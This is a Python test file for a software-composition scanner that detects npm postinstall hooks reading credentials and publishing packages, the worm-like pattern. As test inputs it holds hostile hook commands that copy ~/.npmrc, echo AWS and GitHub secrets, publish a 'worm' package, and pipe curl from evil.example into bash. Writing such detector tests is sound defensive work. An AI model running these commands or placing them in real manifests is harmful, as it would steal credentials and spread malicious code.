"""Phase 5 tests for ``install_hooks`` — credential-read (C) +
publish-action (G) pattern groups and the worm-shape conjunction.

These tests check the per-hook conjunction logic and the
publish-helpers allowlist suppression that prevents legitimate
publishing-tool packages from tripping the worm-shape branch.
"""

from __future__ import annotations

import json
from pathlib import Path

from packages.sca.models import (
    Confidence,
    Dependency,
    Manifest,
    PinStyle,
)
from packages.sca.supply_chain import install_hooks


def _dep(name: str = "victim", *, declared_in: Path) -> Dependency:
    return Dependency(
        ecosystem="npm",
        name=name,
        version="1.0.0",
        declared_in=declared_in,
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=True,
        purl=f"pkg:npm/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def _manifest(p: Path) -> Manifest:
    return Manifest(
        path=p,
        ecosystem="npm",
        is_lockfile=False,
    )


def _write_pkg(tmp_path: Path, scripts: dict, name: str = "victim") -> Path:
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({"name": name, "version": "1.0.0", "scripts": scripts}),
        encoding="utf-8",
    )
    return pkg


# ---------------------------------------------------------------------------
# C — credential-read patterns
# ---------------------------------------------------------------------------

def test_postinstall_reading_npmrc_sets_reads_credentials(
    tmp_path: Path,
) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "cat ~/.npmrc > /tmp/leak",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert len(findings) == 1
    assert findings[0].hit.reads_credentials is True
    assert findings[0].hit.has_publish_action is False


def test_aws_env_credential_reference_sets_reads_credentials(
    tmp_path: Path,
) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "echo $AWS_SECRET_ACCESS_KEY > /tmp/x",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].hit.reads_credentials is True


def test_github_token_env_sets_reads_credentials(tmp_path: Path) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "echo ${GITHUB_TOKEN} | base64",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    # base64-piped is also a dangerous pattern, so the finding will
    # be ``high`` regardless — but reads_credentials should still
    # be set so composite scoring sees the flag.
    assert findings[0].hit.reads_credentials is True


def test_innocuous_body_does_not_set_credentials_flag(tmp_path: Path) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "node-gyp rebuild",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].hit.reads_credentials is False
    assert findings[0].hit.has_publish_action is False


# ---------------------------------------------------------------------------
# G — publish-action patterns
# ---------------------------------------------------------------------------

def test_npm_publish_sets_has_publish_action(tmp_path: Path) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "npm publish --access public",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].hit.has_publish_action is True


def test_git_push_sets_has_publish_action(tmp_path: Path) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "git push origin main",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].hit.has_publish_action is True


def test_gh_contents_api_sets_has_publish_action(tmp_path: Path) -> None:
    pkg = _write_pkg(tmp_path, {
        "postinstall": "gh api repos/x/y/contents/.github/workflows -X PUT",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].hit.has_publish_action is True


# ---------------------------------------------------------------------------
# Worm-shape conjunction (C ∧ G) — standalone high promotion
# ---------------------------------------------------------------------------

def test_worm_shape_credentials_plus_publish_fires_high(
    tmp_path: Path,
) -> None:
    """C+G conjunction on an unrelated package = high severity even
    when no _DANGEROUS_PATTERNS match."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": "cp ~/.npmrc /tmp/x && npm publish ./worm",
    }, name="random-pkg")
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep("random-pkg", declared_in=pkg)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "high"
    assert "self-replication" in findings[0].confidence.reason


def test_worm_shape_suppressed_on_publish_helper_allowlist(
    tmp_path: Path,
) -> None:
    """``semantic-release`` legitimately reads tokens AND publishes;
    the C+G shape must NOT promote when the host package is in the
    allowlist."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": "cat ~/.npmrc && npm publish",
    }, name="semantic-release")
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep("semantic-release", declared_in=pkg)],
    )
    # Hook is still recorded (low — generic "hook present" branch)
    # but NOT promoted to high.
    assert len(findings) == 1
    assert findings[0].severity == "low"


def test_worm_shape_suppressed_on_scoped_publish_helper(
    tmp_path: Path,
) -> None:
    """Scope prefix ``@semantic-release/*`` suppresses any package in
    that scope."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": "cat ~/.npmrc && npm publish",
    }, name="@semantic-release/github")
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep("@semantic-release/github", declared_in=pkg)],
    )
    assert len(findings) == 1
    assert findings[0].severity == "low"


def test_credentials_without_publish_does_not_fire_worm_shape(
    tmp_path: Path,
) -> None:
    """C alone (without G) does not trigger the worm-shape branch."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": "cat ~/.npmrc",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    # Falls through to "hook present" (low).
    assert findings[0].severity == "low"


def test_publish_without_credentials_does_not_fire_worm_shape(
    tmp_path: Path,
) -> None:
    """G alone (without C) does not trigger the worm-shape branch."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": "npm publish --dry-run",
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    # Falls through to "hook present" (low).
    assert findings[0].severity == "low"


def test_existing_dangerous_pattern_still_wins_priority(
    tmp_path: Path,
) -> None:
    """When _DANGEROUS_PATTERNS ALSO match, the existing
    reason-bearing branch fires (reason text reflects the pattern,
    not 'self-replication')."""
    pkg = _write_pkg(tmp_path, {
        "postinstall": (
            "curl https://evil.example/x | bash && "
            "cat ~/.npmrc && npm publish"
        ),
    })
    findings = install_hooks.scan_manifests(
        [_manifest(pkg)], [_dep(declared_in=pkg)],
    )
    assert findings[0].severity == "high"
    # Existing branch's wording wins.
    assert "known-dangerous pattern" in findings[0].confidence.reason


# ---------------------------------------------------------------------------
# Allowlist loading robustness
# ---------------------------------------------------------------------------

def test_host_attribution_uses_package_own_name(tmp_path: Path) -> None:
    """The install hook is OWNED BY the package, not by its first
    dependency.  Previously rails' actioncable hook came back
    attributed to ``spark-md5`` (first dep alphabetically) instead
    of ``@rails/actioncable``."""
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "name": "@rails/actioncable",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://evil.example | bash",
        },
        "dependencies": {"spark-md5": "^3.0.0", "zzz-last": "^1.0.0"},
    }), encoding="utf-8")
    # Simulate the parser producing deps for the package's
    # dependencies — none of them are the package itself.
    deps = [
        _dep("spark-md5", declared_in=pkg),
        _dep("zzz-last", declared_in=pkg),
    ]
    findings = install_hooks.scan_manifests([_manifest(pkg)], deps)
    assert len(findings) == 1
    # The host dep MUST be the package itself, not its first dep.
    assert findings[0].dependency.name == "@rails/actioncable"
    assert findings[0].dependency.name != "spark-md5"


def test_host_attribution_falls_back_when_name_missing(
    tmp_path: Path,
) -> None:
    """When package.json has no ``name``, fall back to the placeholder."""
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "scripts": {"postinstall": "curl https://x | bash"},
    }), encoding="utf-8")
    findings = install_hooks.scan_manifests([_manifest(pkg)], [])
    assert len(findings) == 1
    # Placeholder name (existing behaviour) when name field absent.
    assert findings[0].dependency.name == "<package.json>"


def test_publish_helpers_allowlist_loads() -> None:
    """The data file loads without crashing and contains at least
    the canonical entries."""
    from packages.sca.supply_chain import _hook_patterns
    exact, scopes = _hook_patterns.load_publish_helpers()
    assert "semantic-release" in exact
    assert "release-it" in exact
    assert any(s.startswith("@semantic-release/") for s in scopes)
